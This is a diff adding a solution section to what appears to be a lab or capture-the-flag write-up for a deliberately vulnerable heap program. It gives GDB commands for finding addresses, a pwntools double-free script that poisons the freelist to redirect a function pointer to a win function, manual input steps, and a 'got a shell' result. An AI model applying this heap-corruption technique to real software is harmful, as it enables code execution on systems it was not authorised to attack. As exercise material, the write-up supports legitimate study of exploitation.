@@ -262,6 +262,91 @@ except:
 log.success("Exploit completed! All steps executed successfully.")
 ```
 
+## Complete Solution (Finding Addresses with GDB)
+
+### 1. Finding Addresses with GDB
+
+```bash
+# Open binary with GDB
+gdb ./compiled/vulnerable_code
+
+# Find function addresses
+(gdb) info functions
+(gdb) info functions win
+(gdb) x/gx win
+
+# Find global variable addresses
+(gdb) info variables
+(gdb) x/gx &gTarget
+(gdb) x/gx &gTarget.fn
+
+# Examine heap state
+(gdb) break my_free
+(gdb) run
+(gdb) x/32gx g_head
+(gdb) continue
+```
+
+### 2. Creating Double-Free Exploit
+
+```python
+from pwn import *
+
+# Get addresses from GDB
+target_fn_addr = 0x100008090  # &gTarget.fn
+win_addr = 0x100000580        # win function
+
+def alloc():
+    p.sendline(b"alloc")
+    return p.recvuntil(b"> ")
+
+def free(idx):
+    p.sendline(f"free {idx}".encode())
+    return p.recvuntil(b"> ")
+
+def write(idx, data_hex):
+    p.sendline(f"write {idx} {data_hex}".encode())
+    return p.recvuntil(b"> ")
+
+# Exploit steps
+alloc()  # chunk 0 (A)
+alloc()  # chunk 1 (B)
+free(0)  # Free A
+free(0)  # Double free!
+
+# Poison freelist
+poison_payload = p64(target_fn_addr).hex()
+write(0, poison_payload)
+
+# Allocation with heap corruption
+alloc()  # Get A back
+alloc()  # Get A again (due to double-free)
+```
+
+### 3. Manual Test
+
+```bash
+# Run program
+./compiled/vulnerable_code
+
+# Enter commands manually
+alloc
+alloc
+free 0
+free 0
+write 0 0908001000000000
+alloc
+alloc
+call
+```
+
+### 4. Expected Result
+
+```
+[+] Congratulations! You got a shell!
+[+] This means you successfully exploited the double-free vulnerability!
+```
+
 When you run this script, it will step by step manipulate the custom heap manager and achieve heap corruption. Even if the program crashes, this indicates successful exploitation.
 
 **Important Notes:**
